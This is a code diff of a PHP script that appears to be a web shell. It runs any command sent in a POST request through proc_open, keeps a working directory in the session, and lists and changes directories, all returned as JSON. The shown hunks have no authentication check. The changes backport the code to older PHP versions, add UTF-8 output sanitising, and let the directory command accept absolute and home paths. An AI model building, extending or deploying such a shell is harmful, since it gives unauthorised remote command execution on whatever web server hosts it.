@@ -9,13 +9,24 @@ if (!isset($_SESSION['cwd'])) {
     $_SESSION['cwd'] = realpath(__DIR__);
 }
 
+function sanitizeUtf8($str) {
+    if (function_exists('mb_convert_encoding')) {
+        return mb_convert_encoding($str, 'UTF-8', 'UTF-8');
+    }
+    if (function_exists('iconv')) {
+        $result = @iconv('UTF-8', 'UTF-8//IGNORE', $str);
+        return $result !== false ? $result : '';
+    }
+    return preg_replace('/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/', '', $str);
+}
+
 function executeCommand($cmd) {
     $cwd = $_SESSION['cwd'];
-    $descriptorspec = [
-        0 => ["pipe", "r"],
-        1 => ["pipe", "w"],
-        2 => ["pipe", "w"]
-    ];
+    $descriptorspec = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w")
+    );
     $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
     if (is_resource($process)) {
         $stdout = stream_get_contents($pipes[1]);
@@ -24,22 +35,22 @@ function executeCommand($cmd) {
         fclose($pipes[1]);
         fclose($pipes[2]);
         proc_close($process);
-        return ['stdout' => trim($stdout), 'stderr' => trim($stderr)];
+        return array('stdout' => sanitizeUtf8(trim($stdout)), 'stderr' => sanitizeUtf8(trim($stderr)));
     }
-    return ['stdout' => '', 'stderr' => 'Failed to execute command'];
+    return array('stdout' => '', 'stderr' => 'Failed to execute command');
 }
 
 function listDirectory($path) {
-    $items = [];
+    $items = array();
     if (is_dir($path) && $handle = opendir($path)) {
         while (($entry = readdir($handle)) !== false) {
             if ($entry === '.' || $entry === '..') continue;
             $fullPath = $path . DIRECTORY_SEPARATOR . $entry;
-            $items[] = [
+            $items[] = array(
                 'name' => $entry,
                 'type' => is_dir($fullPath) ? 'dir' : 'file',
                 'size' => is_file($fullPath) ? filesize($fullPath) : 0
-            ];
+            );
         }
         closedir($handle);
         usort($items, function($a, $b) {
@@ -52,35 +63,57 @@ function listDirectory($path) {
     return $items;
 }
 
+function sendJson($data) {
+    ob_clean();
+    header('Content-Type: application/json');
+    $jsonFlags = defined('JSON_INVALID_UTF8_SUBSTITUTE') ? JSON_INVALID_UTF8_SUBSTITUTE : 0;
+    $json = json_encode($data, $jsonFlags);
+    if ($json === false) {
+        $data['data'] = sanitizeUtf8(is_string($data['data']) ? $data['data'] : json_encode($data['data']));
+        $json = json_encode($data, $jsonFlags);
+        if ($json === false) {
+            $json = '{"success":false,"data":"JSON encoding failed","cwd":"' . addslashes($_SESSION['cwd']) . '"}';
+        }
+    }
+    echo $json;
+    ob_end_flush();
+    exit;
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $action = $_POST['action'] ?? '';
-    $response = ['success' => false, 'data' => '', 'cwd' => $_SESSION['cwd']];
+    $action = isset($_POST['action']) ? $_POST['action'] : '';
+    $response = array('success' => false, 'data' => '', 'cwd' => $_SESSION['cwd']);
 
     switch ($action) {
         case 'exec':
-            $cmd = $_POST['cmd'] ?? '';
+            $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
             if ($cmd) {
                 $result = executeCommand($cmd);
                 $output = '';
                 if ($result['stdout']) $output .= $result['stdout'];
                 if ($result['stderr']) $output .= ($output ? "\n" : '') . $result['stderr'];
-                $response['data'] = $output ?: '(no output)';
+                $response['data'] = $output ? $output : '(no output)';
                 $response['success'] = true;
             }
             break;
 
         case 'cd':
-            $dir = $_POST['dir'] ?? '';
+            $dir = isset($_POST['dir']) ? $_POST['dir'] : '';
             if ($dir) {
-                $newPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $dir;
-                $realPath = realpath($newPath);
-                if ($realPath && is_dir($realPath)) {
-                    $_SESSION['cwd'] = $realPath;
-                    $response['cwd'] = $realPath;
-                    $response['data'] = "Changed directory to: $realPath";
+                if ($dir === '~') {
+                    $newPath = realpath(getenv('HOME') ? getenv('HOME') : '/');
+                } elseif ($dir[0] === '/' || $dir[0] === '\\') {
+                    $newPath = realpath($dir);
+                } else {
+                    $newPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $dir);
+                }
+                if ($newPath && is_dir($newPath)) {
+                    $_SESSION['cwd'] = $newPath;
+                    $response['cwd'] = $newPath;
+                    $response['data'] = 'Changed directory to: ' . $newPath;
                     $response['success'] = true;
                 } else {
-                    $response['data'] = "Invalid directory: $dir";
+                    $response['data'] = 'Invalid directory: ' . $dir;
                 }
             }
             break;
@@ -97,12 +130,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             break;
     }
 
-    ob_clean();
-    header('Content-Type: application/json');
-    echo json_encode($response);
-    ob_end_flush();
-    exit;
+    sendJson($response);
 }
+
 ob_end_clean();
 ?>
 <!DOCTYPE html>
